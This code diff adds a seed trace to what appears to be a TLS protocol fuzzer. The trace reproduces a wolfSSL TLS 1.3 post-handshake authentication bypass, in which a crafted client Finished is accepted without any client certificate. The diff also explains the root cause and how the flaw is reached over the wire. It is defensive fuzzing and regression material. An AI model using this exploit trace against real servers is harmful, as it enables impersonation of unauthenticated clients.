@@ -42,6 +42,10 @@ pub fn create_corpus(
 
         // Downgrade attack: the client offers both TLS 1.2 and TLS 1.3 (`TLSVersion::Both`).
         seed_cve_2024_5814: put.supports("tls12") && put.supports("tls13"),
+
+        // The server requests the client certificate after the handshake (post-handshake
+        // authentication): descriptor sets `client_authentication` and `post_handshake_auth`.
+        seed_cve_2026_55962: put.supports("tls13") && put.supports("post_handshake_auth"),
     )
 }
 
@@ -1588,4 +1592,73 @@ pub mod tests {
             }
         }
     }
+}
+
+/// <https://github.com/wolfSSL/wolfssl/pull/10702> (CVE-2026-55962)
+///
+/// Root cause: in TLS 1.3, wolfSSL servers configured with `WOLFSSL_VERIFY_POST_HANDSHAKE`
+/// accept a missing client certificate during the initial handshake. The exemption is a
+/// connection-wide option (`verifyPostHandshake`) which was also applied in `DoTls13Finished` and
+/// `SanityCheckTls13MsgReceived` while a post-handshake CertificateRequest (`certReqCtx`) was
+/// outstanding: the client's Finished was accepted without a Certificate and a CertificateVerify
+/// (CWE-287).
+///
+/// Reachability: wire-reachable, from a non-conformant client. The client announces the
+/// `post_handshake_auth` extension (the server only accepts `wolfSSL_request_certificate` then),
+/// the handshake completes without client certificate, then the server requests a certificate
+/// and the client answers with a Finished only. The server side configuration (the
+/// `VERIFY_POST_HANDSHAKE` mode and the call to `wolfSSL_request_certificate`) is not part of the
+/// trace: it is set with `TLSDescriptorConfig::post_handshake_auth`, hence out of reach of the
+/// mutators.
+///
+/// The attacker is DY term-crafted: the Finished is computed with the client application traffic
+/// secret over the handshake transcript followed by the post-handshake CertificateRequest. The
+/// server accepts it whereas no client certificate was ever received: the PUT then makes its
+/// Finished claims require peer authentication, and the violation policy reports an
+/// "Authentication bypass".
+pub fn seed_cve_2026_55962(server: AgentName) -> Trace<TLSProtocolTypes> {
+    let (
+        mut trace,
+        server_hello_transcript,
+        server_finished_transcript,
+        _certificate_request,
+        post_handshake_transcript,
+    ) = _seed_client_attacker_post_handshake_auth(server);
+
+    // Compared to `seed_client_attacker_post_handshake_auth`, the Certificate and the
+    // CertificateVerify are not sent: the Finished only covers the CertificateRequest
+    let post_handshake_client_finished = term! {
+        fn_finished(
+            (fn_verify_data_post_handshake(
+                (@post_handshake_transcript),
+                (@server_finished_transcript),
+                (@server_hello_transcript),
+                (fn_get_server_key_share(((server, 0)))),
+                fn_no_psk,
+                fn_named_group_secp384r1,
+                fn_new_random,
+                fn_cipher_suite13_aes_128_gcm_sha256
+             ))
+        )
+    };
+
+    trace.steps.push(Step {
+        agent: server,
+        action: Action::Input(input_action! { term! {
+                fn_encrypt_application(
+                    (@post_handshake_client_finished),
+                    (@server_hello_transcript),
+                    (@server_finished_transcript),
+                    (fn_get_server_key_share(((server, 0)))),
+                    fn_no_psk,
+                    fn_named_group_secp384r1,
+                    fn_seq_0,  // first record sent with the client application traffic secret
+                    fn_new_random,
+                    fn_cipher_suite13_aes_128_gcm_sha256
+                )
+            }
+        }),
+    });
+
+    trace
 }
